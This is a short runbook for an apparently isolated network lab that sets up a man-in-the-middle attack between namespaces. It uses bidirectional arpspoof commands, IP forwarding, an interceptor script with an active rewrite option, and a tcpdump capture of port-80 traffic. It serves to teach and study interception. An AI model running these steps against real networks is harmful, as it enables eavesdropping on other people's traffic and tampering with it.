# MITM Interception

## Goal
Observe and optionally alter clear-text HTTP traffic while attacker sits in-path.

## Preconditions
1. Enable forwarding in attacker namespace.
2. Run ARP spoof in both directions.

```bash
sudo ip netns exec ns-atk sysctl -w net.ipv4.ip_forward=1
sudo ip netns exec ns-atk arpspoof -i veth-atk -t 10.0.0.10 10.0.0.1
sudo ip netns exec ns-atk arpspoof -i veth-atk -t 10.0.0.1 10.0.0.10
```

## Run interceptor
```bash
sudo ip netns exec ns-atk python3 /home/reddy/codex-workspace/netlab/attacks/02-mitm/intercept.py --iface veth-atk
```

## Optional payload copy-rewrite demo
```bash
sudo ip netns exec ns-atk python3 /home/reddy/codex-workspace/netlab/attacks/02-mitm/intercept.py \
  --iface veth-atk \
  --active-modify \
  --replace-from target.lab \
  --replace-to attacker.lab
```

## Capture
```bash
sudo ip netns exec ns-atk tcpdump -ni veth-atk tcp port 80 -w /home/reddy/codex-workspace/netlab/captures/02-mitm.pcap
```
